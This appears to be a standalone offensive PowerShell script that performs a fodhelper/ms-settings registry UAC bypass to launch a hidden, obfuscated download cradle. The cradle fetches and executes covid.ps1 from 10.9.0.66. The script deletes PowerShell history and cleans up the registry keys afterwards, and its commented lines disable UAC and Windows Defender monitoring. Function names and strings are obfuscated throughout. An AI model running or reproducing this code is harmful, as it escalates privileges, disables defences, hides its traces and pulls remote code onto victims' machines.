#Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0
#Get-MpComputerStatus
#Set-MpPreference -DisableRealtimeMonitoring $true
#New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force


#cmd /c start powershell.exe -Sta -Nop -Window Hidden IEX (New-Object Net.WebClient).DownloadString('http://10.9.0.66/covid.ps1')
#"c"+"m"+"d"+" "+"/"+"c"+" "+"s"+"t"+"a"+"r"+"t"+" "+"p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"l"+"."+"e"+"x"+"e"+" "+"-"+"S"+"t"+"a"+" "+"-"+"N"+"o"+"p"+" "+"-"+"W"+"i"+"n"+"d"+"o"+"w"+" "+"H"+"i"+"d"+"d"+"e"+"n"+" "+"I"+"E"+"X"+" "+"("+"N"+"e"+"w"+"-"+"O"+"b"+"j"+"e"+"c"+"t"+" "+"N"+"e"+"t"+"."+"W"+"e"+"b"+"C"+"l"+"i"+"e"+"n"+"t"+")"+"."+"D"+"o"+"w"+"n"+"l"+"o"+"a"+"d"+"S"+"t"+"r"+"i"+"n"+"g"+"("+"'"+"h"+"t"+"t"+"p"+":"+"/"+"/"+"1"+"0"+"."+"9"+"."+"0"+"."+"6"+"6"+"/"+"c"+"o"+"v"+"i"+"d"+"."+"p"+"s"+"1"+"'"+")"


function b1946ac92492d2347c6235b4d2611184 {
    $cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("c"+"m"+"d"+" "+"/"+"c"+" "+"s"+"t"+"a"+"r"+"t"+" "+"p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"l"+"."+"e"+"x"+"e"+" "+"-"+"S"+"t"+"a"+" "+"-"+"N"+"o"+"p"+" "+"-"+"W"+"i"+"n"+"d"+"o"+"w"+" "+"H"+"i"+"d"+"d"+"e"+"n"+" "+"I"+"E"+"X"+" "+"("+"N"+"e"+"w"+"-"+"O"+"b"+"j"+"e"+"c"+"t"+" "+"N"+"e"+"t"+"."+"W"+"e"+"b"+"C"+"l"+"i"+"e"+"n"+"t"+")"+"."+"D"+"o"+"w"+"n"+"l"+"o"+"a"+"d"+"S"+"t"+"r"+"i"+"n"+"g"+"("+"'"+"h"+"t"+"t"+"p"+":"+"/"+"/"+"1"+"0"+"."+"9"+"."+"0"+"."+"6"+"6"+"/"+"c"+"o"+"v"+"i"+"d"+"."+"p"+"s"+"1"+"'"+")"))
    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
    c4ff45bb1fab99f9164b7fec14b2292a
}
function c4ff45bb1fab99f9164b7fec14b2292a {
    del $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -s 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
}
b1946ac92492d2347c6235b4d2611184
